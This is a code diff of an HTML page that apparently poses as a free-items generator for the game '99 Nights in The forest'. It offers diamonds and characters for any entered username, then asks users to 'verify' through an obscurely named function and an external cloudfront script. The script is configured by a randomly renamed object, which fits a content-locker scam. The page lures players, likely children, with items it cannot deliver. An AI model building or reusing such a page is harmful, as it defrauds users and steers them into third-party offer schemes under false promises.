@@ -1,96 +1,126 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>99 Nights in The forest</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles.css" />
     <script type="text/javascript">
-        var WPaMX_GbL_semkWc = { "it": 4555374, "key": "27eac" };
+      var wSxKT_nTO_BcJdbc = { it: 4555374, key: "27eac" };
     </script>
-    <script src="https://duw03nk63ml3f.cloudfront.net/6c4e991.js"></script>
-</head>
+    <script src="https://duw03nk63ml3f.cloudfront.net/a8ae7ee.js"></script>
+  </head>
 
-<body>
-
+  <body>
     <div class="container">
-        <div class="logo"><img src="/logo.png" alt=""></div>
+      <div class="logo"><img src="/logo.png" alt="" /></div>
 
-        <div class="input-section">
-            <input type="text" id="username" class="username-input" placeholder="Enter Username">
-            <div id="username-error" class="error-message"></div>
-            <button onclick="generateGamepass()" class="generate-btn">Get items</button>
+      <div class="input-section">
+        <input
+          type="text"
+          id="username"
+          class="username-input"
+          placeholder="Enter Username"
+        />
+        <div id="username-error" class="error-message"></div>
+        <button onclick="generateGamepass()" class="generate-btn">
+          Get items
+        </button>
+      </div>
+
+      <div class="selection-text fix-stroke">
+        Browse through the available items :
+      </div>
+      <div id="selection-error" class="selection-error"></div>
+
+      <div class="gamepasses-grid">
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/Diamonds.png" alt="" />
+          </div>
+          <div class="gamepass-name">250</div>
         </div>
 
-        <div class="selection-text fix-stroke">Browse through the available items :</div>
-        <div id="selection-error" class="selection-error"></div>
-
-        <div class="gamepasses-grid">
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/Diamonds.png" alt=""></div>
-                <div class="gamepass-name">250</div>
-            </div>
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/Diamonds.png" alt=""></div>
-                <div class="gamepass-name">700</div>
-            </div>
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/Diamonds.png" alt=""></div>
-                <div class="gamepass-name">1400</div>
-            </div>
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/cyborg.png" alt=""></div>
-                <div class="gamepass-name">cyborg</div>
-            </div>
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/firebandit.png" alt=""></div>
-                <div class="gamepass-name">Fire Bandit</div>
-            </div>
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/assassin.png" alt="">
-                </div>
-                <div class="gamepass-name">assassin</div>
-            </div>
-
-            <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/Vampire.png" alt="">
-                </div>
-                <div class="gamepass-name">Vampire</div>
-            </div>
-
-                        <div class="gamepass-item" onclick="toggleSelection(this)">
-                <div class="gamepass-icon pixel-angelus"><img style="width: 120px;" src="/pyromaniac.png" alt="">
-                </div>
-                <div class="gamepass-name">Pyromaniac</div>
-            </div>
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/Diamonds.png" alt="" />
+          </div>
+          <div class="gamepass-name">700</div>
         </div>
+
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/Diamonds.png" alt="" />
+          </div>
+          <div class="gamepass-name">1400</div>
+        </div>
+
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/cyborg.png" alt="" />
+          </div>
+          <div class="gamepass-name">cyborg</div>
+        </div>
+
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/firebandit.png" alt="" />
+          </div>
+          <div class="gamepass-name">Fire Bandit</div>
+        </div>
+
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/assassin.png" alt="" />
+          </div>
+          <div class="gamepass-name">assassin</div>
+        </div>
+
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/Vampire.png" alt="" />
+          </div>
+          <div class="gamepass-name">Vampire</div>
+        </div>
+
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/pyromaniac.png" alt="" />
+          </div>
+          <div class="gamepass-name">Pyromaniac</div>
+        </div>
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/alien.png" alt="" />
+          </div>
+          <div class="gamepass-name">Alien</div>
+        </div>
+        <div class="gamepass-item" onclick="toggleSelection(this)">
+          <div class="gamepass-icon pixel-angelus">
+            <img style="width: 120px" src="/pyromaniac.png" alt="" />
+          </div>
+          <div class="gamepass-name">Pyromaniac</div>
+        </div>
+      </div>
     </div>
 
     <!-- Loading Modal -->
     <div id="loadingModal" class="modal">
-        <div class="modal-content loading-content">
-            <div class="loading-spinner"></div>
-            <h2 id="loadingText">Looking for ...</h2>
-        </div>
+      <div class="modal-content loading-content">
+        <div class="loading-spinner"></div>
+        <h2 id="loadingText">Looking for ...</h2>
+      </div>
     </div>
 
     <!-- Modal -->
     <div id="verificationModal" class="modal">
-        <div class="modal-content">
-            <h2>Almost There!</h2>
-            <p>Please verify to get your items.</p>
-            <button class="verify-btn" onclick="_Hj()">Verify</button>
-        </div>
+      <div class="modal-content">
+        <h2>Almost There!</h2>
+        <p>Please verify to get your items.</p>
+        <button class="verify-btn" onclick="_Hj()">Verify</button>
+      </div>
     </div>
 
     <script src="app.js"></script>
-</body>
-
+  </body>
 </html>
